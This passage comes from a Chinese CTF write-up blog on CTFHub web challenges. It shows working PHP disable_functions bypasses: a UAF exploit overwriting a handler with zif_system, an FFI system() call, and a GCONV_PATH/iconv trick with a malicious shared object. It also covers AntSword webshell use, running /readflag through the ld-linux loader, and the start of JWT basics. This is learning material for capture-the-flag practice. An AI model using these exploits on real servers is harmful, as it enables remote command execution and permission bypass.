class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用hackBar或者burp传递post数据就能获取数据</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/6.png" alt=""></p><h6 id="2-蚁剑-6">2.蚁剑</h6><p>老样子没什么好说的，用插件就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/UAF/7.png" alt=""></p><h5 id="8-FFI扩展">8.FFI扩展</h5><blockquote><p>FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。</p></blockquote><p>简单来说</p><p>FFI提供了高级语言直接的互相调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库</p><p>传统的方式，当我们需要用一些已有的C语言的库的能力的时候，我们需要用C语言写wrapper，把他们包装成扩展，这个过程中就需要大家去学习PHP的扩展怎么写，当然现在也有一些方便的方式，比如Zephir. 但总还是有一些学习成本的，而有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。</p><p>而C语言几十年的历史中，积累了大量的优秀的库，FFI直接让我们可以方便的享受这个庞大的资源了。</p><p><a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式 - 风雪之隅 (laruence.com)</a></p><h6 id="1-手工-4">1.手工</h6><p>exp代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 创建了一个新的FFI（Foreign Function Interface）对象，并使用cdef方法定义了一个C语言的函数system。这个函数接受一个字符指针参数，并返回一个整数。在C语言中，system函数通常用于执行shell命令。</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="comment"># 调用了上面定义的system函数，传递了一个字符串参数&quot;tac /flag &gt; /tmp/123&quot;。这个字符串是一个shell命令，它的功能是读取名为flag的文件（通常位于Web服务器的文档根目录），并将其内容以反向顺序写入</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /flag &gt; /tmp/123&quot;</span>);</span><br><span class="line"><span class="comment"># 使用PHP的file_get_contents函数读取/tmp/123文件的内容，并将其输出到屏幕上。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/123&quot;</span>);</span><br><span class="line"><span class="comment"># 最后，这行代码使用PHP的unlink函数删除/tmp/123文件。使用@符号是为了抑制可能出现的错误消息。</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/123&quot;</span>);</span><br></pre></td></tr></table></figure><p>上传后访问页面</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/FFI/1.png" alt=""></p><h6 id="2-蚁剑-7">2.蚁剑</h6><p>老样子没什么好说的，用插件就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/FFI/2.png" alt=""></p><h5 id="9-iconv">9.iconv</h5><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()。</p><p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中。</p><p>下面我们来看一下iconv_open函数的执行过程：</p><blockquote><ol><li>iconv_open函数首先会找到系统提供的gconv-modules文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置。</li><li>然后再根据gconv-modules文件的指示去链接参数对应的.so文件。</li><li>之后会调用.so文件中的gconv()与gonv_init()函数。</li><li>然后就是一些与本漏洞利用无关的步骤。</li></ol></blockquote><p>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件，因此，如果指定了GCONV_PATH的值，iconv_open函数的执行过程会如下：</p><blockquote><ol><li>iconv_open函数依照GCONV_PATH找到gconv-modules文件。</li><li>根据gconv-modules文件的指示找到参数对应的.so文件。</li><li>调用.so文件中的gconv()和gonv_init()函数。</li><li>一些其他步骤。</li></ol></blockquote><h6 id="1-手工-5">1.手工</h6><p>bypass过程</p><p>我们的利用方式就是首先在某一文件夹（一般是/tmp）中上传gconv-modules文件，<a href="http://xn--fiq9bu0agbd721qlnab700miiccvkja9467cda109owqz4t2f.so">文件中指定我们自定义的字符集文件的.so</a>，然后我们再在.so文件中的gonv_init()函数中书写命令执行函数，之后上传php的shell，内容是使用php设定GCONV_PATH指向我们的gconv-modules文件，然后使用iconv函数使我们的恶意代码执行。</p><p>当我们使用浏览器访问我们上传的shell之后，服务器会做如下步骤：</p><blockquote><ol><li>设定GCONV_PATH指向我们的gconv-modules文件。</li><li>执行php的iconv函数，本质上调用了glibc的iconv_open函数。</li><li>iconv_open函数依照GCONV_PATH找到我们上传gconv-modules文件。</li><li>根据gconv-modules文件的指示找到参数对应的.so文件。</li><li>调用.so文件中的gconv()和gonv_init()函数，当然，其中是我们想要服务器执行的系统命令。</li></ol></blockquote><p>首先上传gconv-modules文件于/tmp文件夹，其格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  自定义字符集名字（大写）<span class="comment">//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）<span class="comment">//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span></span><br></pre></td></tr></table></figure><p>我是写成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  HACK<span class="comment">//    INTERNAL    ../../../../../../../../tmp/hack    2</span></span><br><span class="line">module  INTERNAL    HACK<span class="comment">//    ../../../../../../../../tmp/hack    2</span></span><br></pre></td></tr></table></figure><p>再书写hack.c文件:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;/readflag &gt; /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成.so文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/1.png" alt=""></p><p>将生成的.so文件上传到/tmp。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/2.png" alt=""></p><p>再上传shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/3.png" alt=""></p><p>访问shell.php就能看到<code>/tmp</code>文件夹下有flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/4.png" alt=""></p><h6 id="2-蚁剑-8">2.蚁剑</h6><p>老样子没什么好说的用插件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/7.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/6.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/8.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/iconv/9.png" alt=""></p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions_gconv-modules-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/8669">ByteCTF WP-无需mail bypass disable_functions - 先知社区 (aliyun.com)</a></p><p><a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">Getting Arbitrary Code Execution from fopen’s 2nd Argument | The Pwnbroker (hugeh0ge.github.io)</a></p><p><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80">Bypass shell_exec or system disabled functions by using GCONV (PHP rce to system()) (github.com)</a></p><p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8">AntSword-Labs/bypass_disable_functions/8 at master · AntSwordProject/AntSword-Labs (github.com)</a></p><h5 id="10-bypass-iconv-1">10.bypass iconv 1</h5><p>手工方法不行，只能用脚本，步骤和上面一样，不重复解释</p><h5 id="11-bypass-iconv-2">11.bypass iconv 2</h5><p>手工方法不行，只能用脚本，步骤和上面一样，不重复解释</p><h4 id="2-Linux">2.Linux</h4><h5 id="1-动态挂载器">1.动态挂载器</h5><blockquote><p>本题难度较大，谨慎开启。学习 Linux ELF Dynaamic Loader 技术。在 ELF 无 x 权限时运行 ELF 文件。</p></blockquote><p>我觉得做这题前先有些前提知识：</p><p><a href="https://zhuanlan.zhihu.com/p/235551437">Linux的so文件到底是干嘛的？浅析Linux的动态链接库</a></p><p><a href="https://blog.csdn.net/qq_26819733/article/details/50610129">linux–&gt;ldd命令的介绍_ldd ln -s-CSDN博客</a></p><p><a href="https://www.cnblogs.com/sun-frederick/p/4763460.html">linux系统——ld-linux.so.X查找和加载共享动态库的顺序 - eric0803 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/lgfun/article/details/100138996">linux系统——ld-linux.so.X作用_linux ld.so-CSDN博客</a></p><p>1.动态库链接器/加载器</p><blockquote><p>当需要动态链接的应用被操作系统加载时系统必须要定位然后加载它所需要的所有动态库文件<br>在Linux环境下，比如说我要执行<code>ls</code>命令，过程是这样的：</p><p>操作系统会将 控制权 交给 <a href="http://ld-linux.so">ld-linux.so</a> 而不是 交给程序正常的进入地址。 ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</p><p><strong>ls在启动时，就需要ld-linux.so加载器将所有的动态库加载后然后再将控制权移交给ls程序的入口。</strong></p></blockquote><p>2.动态加载</p><blockquote><p>动态加载是一种机制，通过该机制，计算机程序可以在运行时将库(或其他二进制)加载到存储器中，检索包含在库中的函数和变量的地址，执行那些函数或访问那些变量，以及从存储器中卸载库。它是计算机程序使用其他软件的三种机制之一；另外两种是静态链接和动态链接。与静态链接和动态链接不同，动态加载允许计算机程序在缺少这些库的情况下启动，以发现可用的库，并潜在地获得附加功能。</p></blockquote><p>3.ELF （文件格式）</p><blockquote><p>在计算机科学中，是一种用于<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661">二进制文件</a>、<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a>、<a href="https://baike.baidu.com/item/%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81/9407934">目标代码</a>、共享库和核心转储格式文件</p><p>通俗理解成在linux下的可执行文件(对比c文件编译后成的链接也是可执行文件)</p></blockquote><p>4.ldd</p><p>ldd本身不是一个程序，而仅是一个shell脚本：ldd可以列出一个程序所需要得动态链接库（so）</p><p>我们可以用which命令找到ldd的位置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> ldd</span></span><br><span class="line">/usr/bin/ldd</span><br></pre></td></tr></table></figure><p>在制作自己的发行版时经常需要判断某条命令需要哪些共享库文件的支持，以确保指定的命令在独立的系统内可以可靠的运行；<br>在Linux环境下我们可以用<code>ldd</code>命令查看某个可执行文件依赖了哪些动态链接库。</p><blockquote><p>ldd命令通常使用&quot;-v&quot;或&quot;–verbose&quot;选项来显示所依赖的动态连接库的尽可能的详细信息。<br>即可得到/bin/ls命令的相关共享库文件列表：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意： 在 ldd 命令打印的结果中，“=&gt;”左边的表示该程序需要连接的共享库之 so 名称，右边表示由 Linux 的共享库系统找到的对应的共享库在文件系统中的具体位置。默认情况下， /etc/ld.so.conf  文件中包含有默认的共享库搜索路径。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">on Ubuntu 16.04 x86_64</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd /bin/ls</span></span><br><span class="line">  linux-vdso.so.1 =&gt;  (0x00007ffcd3dd9000)</span><br><span class="line"> libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4547151000) # /bin/ls 依赖于 libselinux.so.1 库，该库提供了安全增强 Linux (SELinux) 的支持。</span><br><span class="line"> libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4546d87000)</span><br><span class="line"> libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4546b17000)</span><br><span class="line"> libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4546913000)</span><br><span class="line"> /lib64/ld-linux-x86-64.so.2 (0x00007f4547373000) # 这是动态链接器本身。它是运行时用来加载和链接共享库的程序。</span><br><span class="line"> libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f45466f6000)</span><br></pre></td></tr></table></figure><p><code>so</code>文件后面往往跟着很多数字，这表示了不同的版本。<code>so</code>文件命名规则被称为SONAME：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libname.so.x.y.z</span><br></pre></td></tr></table></figure><p>lib是前缀，这是一个约定俗成的规则。x为主版本号（Major Version），y为次版本号（Minor Version），z为发布版本号（Release Version）。</p><ul><li>Major Version表示重大升级，不同Major Version之间的库是不兼容的。Major Version升级后，或者依赖旧Major Version的程序需要更新代码，重新编译，才可以在新的Major Version上运行；或者操作系统保留旧Major Version，使得老程序依然能运行。</li><li>Minor Version表示增量更新，一般是增加了一些新接口，原来的接口不变。所以，在Major Version相同的情况下，Minor Version从高到低是兼容的。</li><li>Release Version表示库的一些bug修复，性能改进等，不添加任何新的接口，不改变原来的接口。</li></ul><p>但是我们刚刚看到的<code>.so</code>只有一个Major Version，因为这是一个软连接，<code>libname.so.x</code>软连接到了<code>libname.so.x.y.z</code>文件上。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /lib/x86_64-linux-gnu/libpcre.so.3</span><br><span class="line">/lib/x86_64-linux-gnu/libpcre.so.3 -&gt; libpcre.so.3.13.2</span><br></pre></td></tr></table></figure><p>因为不同的Major Version之间不兼容，而Minor Version和Release Version都是向下兼容的，软连接会指向Major Version相同，Minor Version和Release Version最高的<code>.so</code>文件上。</p><h6 id="解题">解题</h6><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/1.png" alt=""></p><p>既然给了我们WebShell，我们直接用蚁剑连就是了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/2.png" alt=""></p><p>然后去找flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/3.png" alt=""></p><p>然后发现flag是0600，readflag是0644</p><blockquote><p>数字表示权限 如 chomd 777 file</p><p>比如说： chomd xyz file</p><p>x: 表示 代表文件所有者拥有的权限 （User）</p><p>y：代表文件所有者同组用户的权限为 （Group）</p><p>z：代表公共用户的权限 （Other）</p><p>同时：读的权限 ： r= 4 写的权限：w = 2 运行的权限为 x = 1</p><p>所以 ，755意味着：</p><p>User rwx属性全都具备：4+2+1=7<br>Group、Other 只具备 r x : 4+1=5<br>644 意味着失去了运行的权限</p></blockquote><p>这个时候我们就能利用<strong>ld-linux.so加载器</strong>进行绕过权限</p><p>原理：</p><blockquote><p>ld-linux.so.2 glibc的库文件，一般链接到相应版本的ld-xxx.so上，是和动态库载入有关的函数</p><p>我们可以通过ldd 命令来查看一个 应用需要哪些依赖的动态库</p><p>同时在加载 动态库的时候，控制权在ld-linux.so加载器加载完所有的动态库的时候才会将权限移交给程序</p><p>而且， ELF 文件提供了相应的加载信息， GCC包含了一个特殊的 ELF 头INTERP， 这个 INTERP指定了 加载器的路径。ELF 规格要求，假如 PT_INTERP 存在的话，操作系统必须创建这个 interpreter文件的运行映射，而不是这个程序本身， 控制权会交给这个interpreter，用来定位和加载所有的动态库.</p><p>从而达到绕过 程序本身的权限不足</p><p>所以我们使用动态加载器动态链接 elf文件</p></blockquote><p>我们先用<code>ldd</code>命令查看运行<code>ls</code>,<code>cat</code>等命令所依赖的共享库和它们的加载路径</p><p>有两种写法，不知道路径可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd `which xxx` # which 命令用于在系统的 PATH 环境变量中查找可执行文件的路径</span><br></pre></td></tr></table></figure><p>知道路径可以直接用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd bin/ls</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/4.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/7.png" alt=""></p><p>然后就能发现这些指令都包括动态链接器本身 <code>/lib64/ld-linux-x86-64.so.2</code>。这意味着动态链接器是运行任何 Linux 可执行文件所必需的组件，包括通过指定其路径来直接执行的可执行文件。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Linux/6.png" alt=""></p><p>因此，通过使用动态链接器的路径 <code>/lib64/ld-linux-x86-64.so.2</code> 来执行 <code>/readflag</code> 文件，实际上是利用了 Linux 系统中的动态链接机制来启动该文件。即使 <code>/readflag</code> 文件的权限限制了其执行范围（如 0644），使用动态链接器仍然可以绕过这些权限限制，因为动态链接器具有足够的权限来加载和执行可执行文件。</p><p>使用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure><p>就能获取flag了</p><p>以上就是我在学习动态挂载器的所得了，因为大部分就是源引资料，而且也加入了自己的理解，可能有部分理解出问题，如有错误，请多包涵，顺便告诉我，一起学习🤗</p><h4 id="3-JSON-Web-Token">3.JSON Web Token</h4><h5 id="1-基础知识">1.基础知识</h5><blockquote><p>学习什么是 JWT</p></blockquote><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob</a></p><h6 id="什么是JWT">什么是JWT</h6><p>Json Web Token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>。</p><p>该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h6 id="JWT-的原理">JWT 的原理</h6><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;角色&quot;</span><span class="punctuation">:</span> <span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h6 id="JWT-的数据结构">JWT 的数据结构</h6><p>实际当中 JWT 长这个样子：</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/2.png" alt=""></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ</span><br></pre></td></tr></table></figure><p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的</p><p>JWT 的三个部分依次如下:</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>写成一行，就是下面的样子。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure><p>每个部分最后都会使用 base64URLEncode方式进行编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">function base64url_encode($data) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/1.png" alt=""></p><h6 id="Header">Header</h6><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，以上面的例子，使用 base64decode 之后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>header部分最常用的两个字段是alg和typ。</p><p>alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法</p><p>typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。</p><h6 id="Payload">Payload</h6><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，还可以在这个部分定义私有字段，以上面的例子为例，将 payload 部分解 base64 之后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分</p></blockquote><h6 id="Signature">Signature</h6><p>Signature 部分是对前两部分的签名，防止数据篡改</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，<strong>使用 Header 里面指定的签名算法（默认是 HMAC SHA256）</strong>，按照下面的公式产生签名。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 